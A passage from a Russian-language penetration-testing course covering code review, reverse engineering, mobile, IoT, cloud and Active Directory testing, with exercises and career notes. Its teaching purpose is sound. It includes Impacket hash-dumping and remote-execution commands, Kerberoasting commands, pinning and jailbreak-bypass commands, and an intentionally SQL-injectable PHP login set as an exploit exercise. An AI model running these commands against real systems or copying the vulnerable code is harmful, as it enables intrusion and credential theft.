│     └─────────┘              └─────────┘              └───────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Инструменты статического анализа

| **Язык** | **Commercial** | **Open Source** | **IDE Integration** |
|----------|----------------|-----------------|---------------------|
| **Java** | Checkmarx, Veracode | SpotBugs, PMD | SonarLint, FindBugs |
| **C/C++** | PVS-Studio | Cppcheck, Flawfinder | PC-lint, Clang Static |
| **C#** | Fortify SCA | Security Code Scan | CodeQL, SonarQube |
| **Python** | Checkmarx | Bandit, Semgrep | Pylint, mypy |
| **JavaScript** | Veracode | ESLint Security | SonarJS, CodeQL |
| **PHP** | RIPS, Checkmarx | PHPCS Security | Psalm, PHPStan |

## 🔍 Manual Code Review

### Методология ревью кода

```
┌─────────────────────────────────────────────────────────────────┐
│                    CODE REVIEW PROCESS                         │
│                                                                 │
│  1. PREPARATION          2. UNDERSTANDING         3. ANALYSIS   │
│  ┌─────────────────┐    ┌─────────────────┐      ┌─────────────┐│
│  │ • Get source    │    │ • Architecture  │      │ • Data flow ││
│  │ • Setup tools   │───►│ • Entry points  │─────►│ • Auth logic││
│  │ • Requirements  │    │ • Data flows    │      │ • Input val ││
│  └─────────────────┘    └─────────────────┘      └─────────────┘│
│                                                         │        │
│                                                         ▼        │
│  6. REPORTING            5. VALIDATION         4. EXPLOITATION   │
│  ┌─────────────────┐    ┌─────────────────┐      ┌─────────────┐│
│  │ • Document bugs │    │ • Reproduce     │      │ • Build PoC ││
│  │ • Risk rating   │◄───│ • False pos     │◄─────│ • Confirm   ││
│  │ • Remediation   │    │ • Business imp  │      │ • Impact    ││
│  └─────────────────┘    └─────────────────┘      └─────────────┘│
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Чек-лист для ревью

```
🔐 AUTHENTICATION & SESSION MANAGEMENT
──────────────────────────────────────────
☐ Проверка силы паролей
☐ Защита от brute force
☐ Безопасная генерация сессий
☐ Правильный logout
☐ Session timeout
☐ Session fixation protection

🛡️ INPUT VALIDATION & SANITIZATION  
─────────────────────────────────────
☐ Валидация всех входных данных
☐ Параметризованные запросы
☐ Экранирование выходных данных
☐ Проверка размеров файлов
☐ MIME type validation
☐ Whitelist validation

🔑 AUTHORIZATION & ACCESS CONTROL
────────────────────────────────────
☐ Принцип минимальных привилегий
☐ Проверка на каждый запрос
☐ Direct object references
☐ Вертикальная проверка прав
☐ Горизонтальная проверка прав

🔒 CRYPTOGRAPHY
──────────────
☐ Использование проверенных алгоритмов
☐ Безопасное хранение ключей
☐ Правильная генерация случайных чисел
☐ Соль для хешей паролей
☐ TLS для передачи данных

⚠️ ERROR HANDLING & LOGGING
──────────────────────────
☐ Отсутствие утечки информации в ошибках
☐ Централизованное логирование
☐ Логирование security events
☐ Защита логов от модификации
☐ Log injection prevention
```

## 🔍 Reverse Engineering

### Инструменты для RE

```
┌─────────────────────────────────────────────────────────────────┐
│                   REVERSE ENGINEERING TOOLS                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  🔍 DISASSEMBLERS           📊 DEBUGGERS          🧰 HEX EDITORS │
│  ─────────────────          ──────────────        ─────────────  │
│  • IDA Pro                  • GDB (Linux)         • HxD          │
│  • Ghidra (NSA)            • WinDbg               • 010 Editor   │
│  • Radare2                 • x64dbg               • Hex Fiend    │
│  • Binary Ninja            • OllyDbg              • Bless        │
│                                                                 │
│  🌐 WEB ANALYSIS            📱 MOBILE ANALYSIS     ☁️ CLOUD      │
│  ────────────────           ─────────────────     ──────────     │
│  • Burp Suite              • APKTool (Android)    • Pacu         │
│  • OWASP ZAP               • Hopper (iOS)         • ScoutSuite   │
│  • Wireshark               • MobSF                • CloudMapper  │
│  • Frida                   • Frida (Mobile)       • Prowler      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Процесс анализа бинарных файлов

```
Binary Analysis Workflow:

1. FILE IDENTIFICATION
   ┌─────────────────────┐
   │ file binary.exe     │
   │ strings binary.exe  │
   │ hexdump -C binary   │
   └─────────────────────┘
            │
            ▼
2. STATIC ANALYSIS  
   ┌─────────────────────┐
   │ • Disassembly      │
   │ • Control flow     │
   │ • Function analysis │
   │ • String analysis  │
   └─────────────────────┘
            │
            ▼
3. DYNAMIC ANALYSIS
   ┌─────────────────────┐
   │ • Debugging        │
   │ • API monitoring   │
   │ • Memory analysis  │
   │ • Network traffic  │
   └─────────────────────┘
            │
            ▼
4. VULNERABILITY RESEARCH
   ┌─────────────────────┐
   │ • Buffer overflows │
   │ • Logic flaws      │
   │ • Crypto issues    │
   │ • Privilege esc    │
   └─────────────────────┘
```

## 📱 Анализ мобильных приложений

### Android Application Analysis

```
┌─────────────────────────────────────────────────────────────────┐
│                   ANDROID PENTESTING FLOW                      │
│                                                                 │
│  📦 APK ACQUISITION      🔍 STATIC ANALYSIS     🔬 DYNAMIC      │
│  ─────────────────       ──────────────────     ─────────       │
│                                                                 │
│  • Google Play          • APKTool               • Emulator      │
│  • APK Mirror           • jadx-gui              • Real device   │
│  • Device extraction    • MobSF                 • Frida         │
│  • APK Pure             • QARK                  • Objection     │
│                                                                 │
│         │                       │                      │        │
│         └───────────────────────┼──────────────────────┘        │
│                                 ▼                               │
│                                                                 │
│  🔐 SECURITY ANALYSIS                                           │
│  ────────────────────                                           │
│  • Manifest permissions                                         │
│  • Hardcoded secrets                                           │
│  • Certificate pinning                                         │
│  • Root detection bypass                                       │
│  • Runtime manipulation                                        │
│  • Traffic interception                                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### iOS Application Analysis

```bash
# Jailbreak detection bypass
frida -U -f com.app.name -l bypass-jailbreak.js

# SSL pinning bypass  
frida -U -f com.app.name -l ssl-kill-switch2.js

# Runtime manipulation
objection -g "App Name" explore

# Binary analysis
class-dump-z App.app/App
otool -L App.app/App
```

## 🎯 Практические задания

### 📝 Задание 1: Анализ исходного кода

**Цель:** Найти уязвимости в PHP веб-приложении

**Исходный код:**
```php
<?php
$user = $_GET['user'];
$pass = $_GET['pass'];

$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
$result = mysql_query($query);

if (mysql_num_rows($result) > 0) {
    echo "Welcome " . $user;
    setcookie("auth", base64_encode($user), time() + 3600);
} else {
    echo "Login failed";
}
?>
```

**Задачи:**
1. Идентифицировать все уязвимости
2. Создать PoC эксплоиты
3. Предложить исправления
4. Написать безопасную версию

### 🔍 Задание 2: Reverse Engineering

**Цель:** Анализ простого crackme

**Инструменты:**
- Ghidra или IDA Free
- GDB или x64dbg
- strings, hexdump

**Задачи:**
1. Статический анализ структуры
2. Поиск алгоритма проверки
3. Извлечение правильного пароля
4. Патчинг для обхода проверки

---

# 🚀 ГЛАВА 3.5: СПЕЦИАЛИЗИРОВАННЫЕ ТЕХНИКИ

**⏱️ Продолжительность:** 3-4 недели  
**🎯 Цель:** Освоить продвинутые техники пентестинга

## 🌐 IoT Pentesting

### IoT Attack Surface

```
┌─────────────────────────────────────────────────────────────────┐
│                      IoT ATTACK VECTORS                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   📱 DEVICE LAYER          🌐 COMMUNICATION           ☁️ CLOUD  │
│   ──────────────           ──────────────────         ──────    │
│                                                                 │
│   • Firmware               • WiFi/Bluetooth            • APIs   │
│   • Hardware               • Zigbee/Z-Wave            • Web     │
│   • Debug ports            • Cellular                 • Mobile  │
│   • Storage                • LoRaWAN                  • Backend │
│                                                                 │
│        │                           │                      │     │
│        ▼                           ▼                      ▼     │
│                                                                 │
│   🔓 ATTACK METHODS                                             │
│   ──────────────                                                │
│   • UART/JTAG access        • Traffic interception             │
│   • Firmware extraction     • Protocol fuzzing                 │
│   • Hardware tampering      • Replay attacks                   │
│   • Side-channel attacks    • Man-in-the-middle                │
│   • Glitching               • API abuse                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### IoT Testing Methodology

```
Phase 1: Information Gathering
├─ Device identification (FCC ID, model)
├─ Manual inspection
├─ Network scanning
└─ Documentation review

Phase 2: Firmware Analysis
├─ Firmware extraction (UART, JTAG, flash)
├─ Binwalk analysis
├─ File system examination
└─ Binary analysis

Phase 3: Network Analysis  
├─ Traffic capture
├─ Protocol analysis
├─ Encryption assessment
└─ Command injection

Phase 4: Physical Security
├─ Case opening
├─ PCB analysis  
├─ Debug port identification
└─ Hardware attacks

Phase 5: Cloud/Backend Testing
├─ API testing
├─ Authentication bypass
├─ Data exposure
└─ Privilege escalation
```

### IoT Testing Tools

| **Категория** | **Инструмент** | **Назначение** |
|---------------|----------------|----------------|
| 🔧 **Hardware** | Logic Analyzer | Анализ сигналов |
| 🔧 **Hardware** | Bus Pirate | Interface с устройствами |
| 🔧 **Hardware** | ChipWhisperer | Side-channel атаки |
| 💾 **Firmware** | Binwalk | Анализ прошивки |
| 💾 **Firmware** | Firmadyne | Эмуляция firmware |
| 💾 **Firmware** | FACT | Автоанализ firmware |
| 📡 **RF/Wireless** | SDR (RTL-SDR) | RF анализ |
| 📡 **RF/Wireless** | HackRF | RF атаки |
| 📡 **RF/Wireless** | Ubertooth | Bluetooth анализ |

## ☁️ Cloud Security Testing

### Cloud Service Models Security

```
┌─────────────────────────────────────────────────────────────────┐
│                   CLOUD SECURITY MODEL                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  📊 SaaS                    🛠️ PaaS                    🏗️ IaaS  │
│  ────────                   ─────────                   ─────── │
│                                                                 │
│  Customer:                  Customer:                  Customer: │
│  • Data                     • Applications             • OS      │
│  • Access                   • Data                     • Apps    │
│                            • Runtime                   • Data    │
│  Provider:                                             • Runtime │
│  • Application             Provider:                            │
│  • Runtime                 • OS                       Provider: │
│  • Middleware             • Virtualization            • Virtualization │
│  • OS                     • Servers                   • Servers │
│  • Virtualization         • Storage                   • Storage │
│  • Servers                • Network                   • Network │
│  • Storage                                                      │
│  • Network                                                      │
│                                                                 │
│  🔍 Test: Configuration,   🔍 Test: App security,     🔍 Test: Infrastructure, │
│      Access controls          Platform config,           Network security,    │
│                               API security                Instance security     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### AWS Security Testing

```bash
# AWS CLI Configuration Testing
aws sts get-caller-identity
aws iam list-users
aws iam get-account-summary

# S3 Bucket Security
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# EC2 Security Groups
aws ec2 describe-security-groups
aws ec2 describe-instances
aws ec2 describe-snapshots --owner-ids self

# IAM Analysis
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-role-policy --role-name RoleName --policy-name PolicyName

# CloudTrail Analysis  
aws cloudtrail describe-trails
aws logs describe-log-groups
```

### Cloud Security Tools

| **Platform** | **Tool** | **Purpose** |
|--------------|----------|-------------|
| **Multi-Cloud** | ScoutSuite | Security auditing |
| **Multi-Cloud** | Prowler | CIS compliance |
| **Multi-Cloud** | CloudMapper | Visualization |
| **AWS** | Pacu | Exploitation framework |
| **AWS** | WeirdAAL | Attack simulation |
| **Azure** | PowerZure | PowerShell toolkit |
| **GCP** | GCP Scanner | Security assessment |

## 🏢 Active Directory Attacks

### AD Attack Paths

```
┌─────────────────────────────────────────────────────────────────┐
│                    AD ATTACK PROGRESSION                        │
│                                                                 │
│  1. INITIAL ACCESS          2. ENUMERATION         3. LATERAL   │
│  ┌─────────────────┐       ┌─────────────────┐    ┌──────────┐  │
│  │ • Phishing      │  ────►│ • Domain info   │───►│ • SMB    │  │
│  │ • Password spray│       │ • User enum     │    │ • RDP    │  │
│  │ • VPN/RDP       │       │ • Share enum    │    │ • WinRM  │  │
│  │ • Physical      │       │ • Service enum  │    │ • PS     │  │
│  └─────────────────┘       └─────────────────┘    └──────────┘  │
│                                                          │       │
│                                                          ▼       │
│  6. PERSISTENCE          5. DOMAIN ADMIN       4. PRIVILEGE ESC  │
│  ┌─────────────────┐     ┌─────────────────┐   ┌─────────────────┐│
│  │ • Golden ticket │ ◄───│ • DCSync        │◄──│ • Kerberoasting ││
│  │ • Silver ticket │     │ • AdminSDHolder │   │ • ASREPRoast    ││
│  │ • Skeleton key  │     │ • DCShadow      │   │ • Unconstrained ││
│  │ • Backdoor user │     │ • NTDS.dit      │   │   delegation    ││
│  └─────────────────┘     └─────────────────┘   └─────────────────┘│
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Key AD Attack Techniques

```powershell
# PowerView Commands
Import-Module PowerView

# Domain enumeration
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer

# Trust relationships
Get-DomainTrust
Get-ForestTrust

# ACL analysis
Get-ObjectAcl -Identity "Domain Admins"
Find-InterestingDomainAcl

# Kerberoasting
Get-DomainUser -SPN
Request-SPNTicket -SPN "service/host"

# ASREPRoast
Get-DomainUser -PreauthNotRequired
```

### Impacket Framework

```bash
# GetNPUsers - ASREPRoast
python3 GetNPUsers.py domain.com/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# GetUserSPNs - Kerberoasting  
python3 GetUserSPNs.py domain.com/user:password -dc-ip 10.0.0.1 -request

# SecretsDump - Extract hashes
python3 secretsdump.py domain.com/user:password@10.0.0.1

# PSExec - Remote execution
python3 psexec.py domain.com/user:password@10.0.0.1

# WMIExec - WMI execution
python3 wmiexec.py domain.com/user:password@10.0.0.1
```

## 🔐 Advanced Persistent Threats (APT) Simulation

### APT Lifecycle

```
┌─────────────────────────────────────────────────────────────────┐
│                       APT KILL CHAIN                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│ 1. RECONNAISSANCE    2. WEAPONIZATION     3. DELIVERY           │
│ ┌───────────────┐   ┌───────────────┐   ┌─────────────┐        │
│ │ • OSINT       │   │ • Malware     │   │ • Email     │        │
│ │ • Social eng  │──►│ • Exploit     │──►│ • Web       │        │
│ │ • Target ID   │   │ • Document    │   │ • USB       │        │
│ └───────────────┘   └───────────────┘   └─────────────┘        │
│                                                  │              │
│                                                  ▼              │
│ 7. ACTIONS ON OBJ   6. C2 & EXFIL        4. EXPLOITATION       │
│ ┌───────────────┐   ┌───────────────┐   ┌─────────────┐        │
│ │ • Data theft  │   │ • Command     │   │ • Code exec │        │
│ │ • Destruction │◄──│ • Control     │◄──│ • System    │        │
│ │ • Disruption  │   │ • Exfil       │   │ • Access    │        │
│ └───────────────┘   └───────────────┘   └─────────────┘        │
│         ▲                                        │              │
│         │           5. INSTALLATION              ▼              │
│         │           ┌───────────────┐   ┌─────────────┐        │
│         └───────────│ • Persistence │◄──│ • Privilege │        │
│                     │ • Backdoors   │   │ • Escalation│        │
│                     │ • Rootkits    │   │ • Lateral   │        │
│                     └───────────────┘   └─────────────┘        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### APT Simulation Tools

| **Framework** | **Description** | **Use Case** |
|---------------|-----------------|--------------|
| **Cobalt Strike** | Commercial C2 framework | Red team exercises |
| **Empire** | PowerShell post-exploitation | Windows environments |
| **Metasploit** | Penetration testing | General exploitation |
| **Caldera** | MITRE ATT&CK automation | Adversary emulation |
| **Atomic Red Team** | Small atomic tests | Detection testing |

## 🎯 Практические задания

### 🏠 Задание 1: IoT Device Assessment

**Цель:** Комплексная оценка безопасности IoT устройства

**Оборудование:**
- IoT устройство (роутер, камера, и т.д.)
- Logic analyzer или осциллограф
- USB-TTL адаптер
- Отвертки и инструменты

**Этапы:**
1. **Физический анализ**
   - Разборка устройства
   - Поиск debug портов
   - Идентификация чипов

2. **Firmware анализ**
   ```bash
   binwalk firmware.bin
   binwalk -e firmware.bin
   find _firmware.bin.extracted -type f -name "*.conf"
   strings firmware.bin | grep -i password
   ```

3. **Network анализ**
   - Перехват трафика
   - Анализ протоколов
   - Поиск уязвимостей

**Deliverable:** Отчет с найденными уязвимостями и рекомендациями

### ☁️ Задание 2: AWS Security Assessment

**Цель:** Аудит безопасности AWS окружения

**Сценарий:** Компания мигрировала в AWS и хочет провести security assessment

**Scope:**
- EC2 instances
- S3 buckets  
- IAM policies
- Security groups
- VPC configuration

**Инструменты:**
```bash
# ScoutSuite
python3 scout.py aws

# Prowler  
./prowler -c

# AWS CLI manual checks
aws iam get-account-summary
aws s3api list-buckets
aws ec2 describe-security-groups
```

**Deliverable:** 
- Отчет о соответствии CIS benchmarks
- Список критических уязвимостей
- План remediation

---

# 🎖️ РЕЗУЛЬТАТЫ БЛОКА 3

## ✅ Полученные навыки

После завершения блока вы будете владеть:

### 🔧 Технические навыки
- **Методологии пентестинга** (PTES, OWASP)
- **Инструменты разведки** (Nmap, theHarvester, OSINT)
- **Frameworks эксплуатации** (Metasploit, Empire, Cobalt Strike)
- **Анализ веб-приложений** (Burp Suite, SQLmap, XSS)
- **Анализ кода** (SAST, manual review, reverse engineering)
- **Специализированные техники** (IoT, Cloud, AD)

### 📊 Управленческие навыки
- **Планирование пентестов**
- **Документирование результатов**
- **Коммуникация с клиентами**
- **Управление рисками**

### 🎯 Практический опыт
- **Реальные сценарии атак**
- **Работа с уязвимостями**
- **CTF и соревнования**
- **Bug bounty hunting**

## 📈 Карьерные возможности

### 🏢 Должности
- **Penetration Tester**
- **Security Consultant**
- **Red Team Member**
- **Application Security Engineer**
- **Vulnerability Researcher**

### 💰 Зарплатные ожидания
| **Уровень** | **Опыт** | **Зарплата (Москва)** |
|-------------|----------|-----------------------|
| Junior | 0-2 года | 100-150k ₽ |
| Middle | 2-4 года | 150-250k ₽ |
| Senior | 4+ лет | 250-400k ₽ |
| Lead | 6+ лет | 400k+ ₽ |

## 🏆 Рекомендуемые сертификации

```
┌─────────────────────────────────────────────────────────────────┐
│                    CERTIFICATION ROADMAP                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  🥉 ENTRY LEVEL              🥈 INTERMEDIATE           🥇 EXPERT │
│  ──────────────              ──────────────────       ───────── │
│                                                                 │
│  • CEH                       • OSCP                   • OSEE    │
│    (EC-Council)              • GCIH                   • GXPN    │
│                              • GCFA                   • OSCE    │
│  • Security+                 • CySA+                            │
│    (CompTIA)                   (CompTIA)                        │
│                                                                 │
│  • GCPT                      • CISSP                 • CISSP   │
│    (GIAC)                      (ISC2)                  (ISC2)   │
│                                                                 │
│  💡 SPECIALTY CERTIFICATIONS:                                  │
│  ──────────────────────────                                    │
│  • GWEB (Web App)            • GMOB (Mobile)         • GREM    │
│  • GWAPT (Web App)           • GCCC (Cloud)            (Malware)│
│  • GASF (Smartphone)         • GCSA (Cloud)          • GNFA    │
│                                                        (Network)│
└─────────────────────────────────────────────────────────────────┘
│